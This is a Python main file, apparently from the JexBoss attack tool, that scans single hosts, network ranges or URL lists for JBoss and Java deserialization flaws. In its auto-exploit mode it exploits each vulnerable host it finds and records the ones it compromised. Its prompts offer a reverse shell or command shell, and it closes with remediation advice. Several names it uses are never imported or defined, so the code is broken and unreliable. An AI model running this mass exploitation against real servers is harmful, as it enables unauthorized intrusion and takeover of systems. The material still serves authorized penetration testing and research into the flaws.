import sys

from requests.models import parse_url

from src.core.checker.proxy import is_proxy_ok
from src.core.cli.parse_args import parse_args
from src.core.http import configure_http_pool
from src.exploits.jx2 import auto_exploit, check_vul
from src.utils.colors import Colors
from src.utils.misc import print_and_flush


def main():
    gl_args = parse_args()

    configure_http_pool()

    if gl_args.proxy and not is_proxy_ok():
        sys.exit(1)

    if gl_args.gadget == 'dns':
        gl_args.cmd = gl_args.dns

    vulnerables = False
    # check vulnerabilities for standalone mode
    if gl_args.mode == 'standalone':
        url = gl_args.host
        scan_results = check_vul(url)
        # performs exploitation for jboss vulnerabilities
        for vector in scan_results:
            if scan_results[vector] == 200 or scan_results[vector] == 500:
                vulnerables = True
                if gl_args.auto_exploit:
                    auto_exploit(url, vector)
                else:

                    if vector == "Application Deserialization":
                        msg_confirm = "   If successful, this operation will provide a reverse shell. You must enter the\n" \
                                      "   IP address and Port of your listening server.\n"
                    else:
                        msg_confirm = "   If successful, this operation will provide a simple command shell to execute \n" \
                                      "   commands on the server..\n"

                    print_and_flush(Colors.BLUE + "\n\n * Do you want to try to run an automated exploitation via \"" +
                                    Colors.BOLD + vector + Colors.NORMAL + "\" ?\n" +
                                    msg_confirm +
                                    Colors.RED + "   Continue only if you have permission!" + Colors.ENDC)
                    if not sys.stdout.isatty():
                        print_and_flush("   yes/NO? ", same_line=True)
                        pick = input().lower() if version_info[0] >= 3 else raw_input().lower()
                    else:
                        pick = input("   yes/NO? ").lower() if version_info[0] >= 3 else raw_input(
                            "   yes/NO? ").lower()

                    if pick == "yes":
                        auto_exploit(url, vector)

    # check vulnerabilities for auto scan mode
    elif gl_args.mode == 'auto-scan':
        file_results = open(gl_args.results, 'w')
        file_results.write("JexBoss Scan Mode Report\n\n")
        for ip in gl_args.network.hosts():
            if gl_interrupted: break
            for port in gl_args.ports.split(","):
                if check_connectivity(ip, port):
                    url = "{0}:{1}".format(ip, port)
                    ip_results = check_vul(url)
                    for key in ip_results.keys():
                        if ip_results[key] == 200 or ip_results[key] == 500:
                            vulnerables = True
                            if gl_args.auto_exploit:
                                result_exploit = auto_exploit(url, key)
                                if result_exploit:
                                    file_results.write("{0}:\t[EXPLOITED VIA {1}]\n".format(url, key))
                                else:
                                    file_results.write("{0}:\t[FAILED TO EXPLOITED VIA {1}]\n".format(url, key))
                            else:
                                file_results.write("{0}:\t[POSSIBLY VULNERABLE TO {1}]\n".format(url, key))

                            file_results.flush()
                else:
                    print_and_flush(Colors.RED + "\n * Host %s:%s does not respond." % (ip, port) + Colors.ENDC)
        file_results.close()
    # check vulnerabilities for file scan mode
    elif gl_args.mode == 'file-scan':
        file_results = open(gl_args.out, 'w')
        file_results.write("JexBoss Scan Mode Report\n\n")
        file_input = open(gl_args.file, 'r')
        for url in file_input.readlines():
            if gl_interrupted: break
            url = url.strip()
            ip = str(parse_url(url)[2])
            port = parse_url(url)[3] if parse_url(url)[3] is not None else 80
            if check_connectivity(ip, port):
                url_results = check_vul(url)
                for key in url_results.keys():
                    if url_results[key] == 200 or url_results[key] == 500:
                        vulnerables = True
                        if gl_args.auto_exploit:
                            result_exploit = auto_exploit(url, key)
                            if result_exploit:
                                file_results.write("{0}:\t[EXPLOITED VIA {1}]\n".format(url, key))
                            else:
                                file_results.write("{0}:\t[FAILED TO EXPLOITED VIA {1}]\n".format(url, key))
                        else:
                            file_results.write("{0}:\t[POSSIBLY VULNERABLE TO {1}]\n".format(url, key))

                        file_results.flush()
            else:
                print_and_flush(Colors.RED + "\n * Host %s:%s does not respond." % (ip, port) + Colors.ENDC)
        file_results.close()

    # resume results
    if vulnerables:
        print_and_flush(Colors.RED + Colors.BOLD + " Results: potentially compromised server!" + Colors.ENDC)
        if gl_args.mode == 'file-scan':
            print_and_flush(Colors.RED + Colors.BOLD + " ** Check more information on file {0} **".format(
                gl_args.out) + Colors.ENDC)
        elif gl_args.mode == 'auto-scan':
            print_and_flush(Colors.RED + Colors.BOLD + " ** Check more information on file {0} **".format(
                gl_args.results) + Colors.ENDC)

        print_and_flush(
            Colors.GREEN + " ---------------------------------------------------------------------------------\n"
            + Colors.BOLD + " Recommendations: \n" + Colors.ENDC +
            Colors.GREEN + " - Remove web consoles and services that are not used, eg:\n"
                           "    $ rm web-console.war http-invoker.sar jmx-console.war jmx-invoker-adaptor-server.sar admin-console.war\n"
                           " - Use a reverse proxy (eg. nginx, apache, F5)\n"
                           " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
                           " - Search vestiges of exploitation within the directories \"deploy\" and \"management\".\n"
                           " - Do NOT TRUST serialized objects received from the user\n"
                           " - If possible, stop using serialized objects as input!\n"
                           " - If you need to work with serialization, consider migrating to the Gson lib.\n"
                           " - Use a strict whitelist with Look-ahead[3] before deserialization\n"
                           " - For a quick (but not definitive) remediation for the viewState input, store the state \n"
                           "   of the view components on the server (this will increase the heap memory consumption): \n"
                           "      In web.xml, change the \"client\" parameter to \"server\" on STATE_SAVING_METHOD.\n"
                           " - Upgrade Apache Struts: https://cwiki.apache.org/confluence/display/WW/S2-045\n"
                           "\n References:\n"
                           "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
                           "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
                           "   [3] - https://www.ibm.com/developerworks/library/se-lookahead/\n"
                           "   [4] - https://www.owasp.org/index.php/Deserialization_of_untrusted_data\n"
                           "\n"
                           " - If possible, discard this server!\n"
                           " ---------------------------------------------------------------------------------")
    else:
        print_and_flush(Colors.GREEN + "\n\n * Results: \n" +
                        "   The server is not vulnerable to bugs tested ... :D\n" + Colors.ENDC)
    # infos
    print_and_flush(Colors.ENDC + " * Info: review, suggestions, updates, etc: \n" +
                    "   https://github.com/joaomatosf/jexboss\n")

    print_and_flush(
        Colors.GREEN + Colors.BOLD + " * DONATE: " + Colors.ENDC + "Please consider making a donation to help improve this tool,\n" +
        Colors.GREEN + Colors.BOLD + " * Bitcoin Address: " + Colors.ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n")
